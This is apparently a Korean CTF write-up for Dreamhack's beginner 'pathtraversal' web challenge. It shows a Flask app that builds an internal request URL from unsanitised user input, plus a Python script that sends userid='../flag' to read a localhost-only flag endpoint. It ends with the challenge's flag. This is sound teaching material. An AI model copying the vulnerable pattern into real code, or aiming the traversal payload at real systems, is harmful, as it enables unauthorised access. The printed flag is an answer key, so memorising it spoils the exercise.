---
title: "[Dreamhack] pathtraversal 해설"
author: jyp
date: 2026-04-03 12:00:00 +0900
categories: [Dreamhack]
tags: [dreamhack , WebHacking]
math: true
---

## 문제 특징

> Querystring과 request라이브러리를 이용한 해킹

### **난이도**: Lv.Beginner
### **카테고리**: 웹해킹

---

## 문제 구조

### 문제파일구성

```
/
└── app.py
```

### 주요 코드

```python

#!/usr/bin/python3
from flask import Flask, request, render_template, abort
from functools import wraps
import requests
import os, json

users = {
    '0': {
        'userid': 'guest',
        'level': 1,
        'password': 'guest'
    },
    '1': {
        'userid': 'admin',
        'level': 9999,
        'password': 'admin'
    }
}

def internal_api(func):
    @wraps(func)
    def decorated_view(*args, **kwargs):
        if request.remote_addr == '127.0.0.1':
            return func(*args, **kwargs)
        else:
            abort(401)
    return decorated_view

app = Flask(__name__)
app.secret_key = os.urandom(32)
API_HOST = 'http://127.0.0.1:8000'

try:
    FLAG = open('./flag.txt', 'r').read() # Flag is here!!
except:
    FLAG = '[**FLAG**]'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/get_info', methods=['GET', 'POST'])
def get_info():
    if request.method == 'GET':
        return render_template('get_info.html')
    elif request.method == 'POST':
        userid = request.form.get('userid', '')
        info = requests.get(f'{API_HOST}/api/user/{userid}').text
        return render_template('get_info.html', info=info)

@app.route('/api')
@internal_api
def api():
    return '/user/<uid>, /flag'

@app.route('/api/user/<uid>')
@internal_api
def get_flag(uid):
    try:
        info = users[uid]
    except:
        info = {}
    return json.dumps(info)

@app.route('/api/flag')
@internal_api
def flag():
    return FLAG

application = app #app.run(host='0.0.0.0', port=8000)
# Dockerfile
#     ENTRYPOINT ["uwsgi", "--socket", "0.0.0.0:8000", "--protocol=http", "--threads", "4", "--wsgi-file", "app.py"]
```
이 문제의 파일에서는 `html` 파일을 제공하지 않는다.

`/api/flag`에 플래그 키가 존재하나, `@internal_api` 함수에 의해 로컬 환경에서만 접속이 가능하도록 제한이 되어 있어 단순히 `/api/flag` 주소로 접속하여 플래그를 얻어낼 수 없다.

## 풀이

### 쿼리 스트링과 requests.get() 함수 활용하기

```python
@app.route('/get_info', methods=['GET', 'POST'])
def get_info():
    if request.method == 'GET':
        return render_template('get_info.html')
    elif request.method == 'POST':
        userid = request.form.get('userid', '')
        info = requests.get(f'{API_HOST}/api/user/{userid}').text
        return render_template('get_info.html', info=info)
```
`/get_info`주소에 `POST`요청을 보냈을때, `userid`라는 파라미터의 값을 입력할 수 있다.
`userid`파라미터는 `info`라는 변수에서 사용되는데, 이 변수는 `request.get()` 함수를 통해 `/api/user/{userid}` 주소에 `get`요청을 보낼수 있으므로, `userid`파라미터에 리소스 경로를 입력하면 `/api/flag`에도 접속이 가능할 것이다.

`POST`요청을 통해서만 해당 과정이 이루어지므로, 파이썬 파일을 하나 생성하여 `POST`요청을 보내보자.

```python
import requests

url = "http://<서버주소>/get_info"
r = requests.post(url, data={"userid": "../flag"})
print(r.text)
```

해당 요청을 전송하면 `get_info.html`파일 속에 플래그가 함께 담겨 나오게 된다.

## 정답

DH{8a33bb6fe0a37522bdc8adb65116b2d4}



